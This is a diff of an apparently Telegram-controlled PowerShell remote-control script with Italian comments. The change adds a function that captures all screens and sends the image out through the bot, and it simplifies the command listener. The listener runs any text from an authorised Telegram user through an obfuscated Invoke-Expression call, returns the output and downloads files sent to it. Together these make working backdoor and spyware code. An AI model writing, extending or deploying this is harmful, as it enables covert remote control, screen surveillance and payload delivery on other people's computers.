@@ -71,6 +71,32 @@ function SendFile($filePath)
     }
 }
 
+function SendScreenshot
+{
+    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+    $left = [Int32]::MaxValue
+    $top = [Int32]::MaxValue
+    $right = [Int32]::MinValue
+    $bottom = [Int32]::MinValue
+    foreach ($screen in [Windows.Forms.Screen]::AllScreens)
+    {
+        if ($screen.Bounds.X -lt $left) { $left = $screen.Bounds.X; }
+        if ($screen.Bounds.Y -lt $top) { $top = $screen.Bounds.Y; }
+        if ($screen.Bounds.X + $screen.Bounds.Width -gt $right) { $right = $screen.Bounds.X + $screen.Bounds.Width; }
+        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height; }
+    }
+    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom);
+    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height;
+    $graphics = [Drawing.Graphics]::FromImage($bmp);
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
+    $bmp.Save("$env:APPDATA\screenshot.png");
+    $graphics.Dispose();
+    $bmp.Dispose();
+    SendFile "$env:APPDATA\screenshot.png"
+    Remove-Item -Path "$env:APPDATA\screenshot.png" -Force
+}
+
 function SendMessage($output, $cmd)
 {
     # To escape _*``[\
@@ -105,8 +131,6 @@ function TestTelegramAPI {
 function CommandListener
 {
     $offset = 0
-    $hostia = $env:COMPUTERNAME
-    $hostname = $hostia
 
     # Inizializza lo stato di raggiungibilità
     $PreviousStatus = $null
@@ -141,59 +165,38 @@ function CommandListener
                     exit
                 }
 
-                if ($text.Length -gt 0) {
-                    # Separa il messaggio per ogni parola in esso
-                    $check_command = $text.Split()
-                    # Verifica se la prima parola del messaggio è "set" ovvero un comando di controllo supplementare
-                    if ($check_command[0] -match "set") {
-                        # Verifica se il comando "set all" è stato inviato per impostare qualsiasi computer per rispondere ai messaggi
-                        if ($check_command[1] -match "all") { $hostname = $hostia; SendMessage "Computer pronto a ricevere istruzioni insieme agli altri host" } 
-                        else {
-                            # Verifica se il comando "set ... " abbia come seconda istruzione l'hostname della macchina da controllare
-                            $hostname = $check_command[1] # Imposta questo computer come l'unico host a rispondere ai comandi 
-                            if ($env:COMPUTERNAME -match $hostname) { SendMessage "Computer pronto a ricevere istruzioni" }
-                        }
-                        continue
-                    }
-                    
-                    # Verifica se il messaggio matcha la stringa "online" per verificare quale computer sia operativo
-                    if ($check_command[0] -match "online") { SendMessage "Computer operativo"; continue }
-                }
+                if ($user_id -match $telegram_id) {
+                    if ($text.Length -gt 0) {
+                        try {
+                            # Verifica se il comando indica a powershell di spostarsi in un'altra cartella da quella in cui è attualmente
+                            $change_location_check = $text -split ' ' | Select-Object -First 1
+                            if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
+                            # Esegue l'istruzione
+                            $output = .(gal ?e[?x])($text) | Out-String
+                        } 
+                        catch { $output = $Error[0] | Out-String }
 
-                if ($hostname -match $hostia) {
-                    if ($user_id -match $telegram_id) {
-                        if ($text.Length -gt 0) {
-                            try {
-                                # Verifica se il comando indica a powershell di spostarsi in un'altra cartella da quella in cui è attualmente
-                                $change_location_check = $text -split ' ' | Select-Object -First 1
-                                if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
-                                # Esegue l'istruzione
-                                $output = .(gal ?e[?x])($text) | Out-String
-                            } 
-                            catch { $output = $Error[0] | Out-String }
-
-                            # Suddivide l'output in blocchi più piccoli per evitare limiti di dimensione
-                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
-                                $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
-                            }
-
-                            # Invia ciascun blocco di output come messaggio separato
-                            foreach ($block in $output_splitted) { 
-                                $block = $block | Out-String
-                                SendMessage $block $text
-                                Start-Sleep -Milliseconds 100
-                            }
-
-                            if ($output.Count -lt 1) { SendMessage ("Comando eseguito: " + $text) }
+                        # Suddivide l'output in blocchi più piccoli per evitare limiti di dimensione
+                        $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
+                            $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
                         }
 
-                        # Se è stato inviato un documento, scaricalo
-                        if ($document) { $file_id = $document.file_id; $file_name = $document.file_name; DownloadFile $file_id $file_name }
-                    } else {
-                        # Se l'utente non è autorizzato, registra il tentativo
-                        $unauth_user_found = ('Utente [{0}] {1} non autorizzato ha inviato il seguente comando al bot: {2}' -f $user_id, $username, $text)
-                        SendMessage $unauth_user_found
+                        # Invia ciascun blocco di output come messaggio separato
+                        foreach ($block in $output_splitted) { 
+                            $block = $block | Out-String
+                            SendMessage $block $text
+                            Start-Sleep -Milliseconds 100
+                        }
+
+                        if ($output.Count -lt 1) { SendMessage ("Comando eseguito: " + $text) }
                     }
+
+                    # Se è stato inviato un documento, scaricalo
+                    if ($document) { $file_id = $document.file_id; $file_name = $document.file_name; DownloadFile $file_id $file_name }
+                } else {
+                    # Se l'utente non è autorizzato, registra il tentativo
+                    $unauth_user_found = ('Utente [{0}] {1} non autorizzato ha inviato il seguente comando al bot: {2}' -f $user_id, $username, $text)
+                    SendMessage $unauth_user_found
                 }
             }
             # Gestione delle pause tra le webrequest 
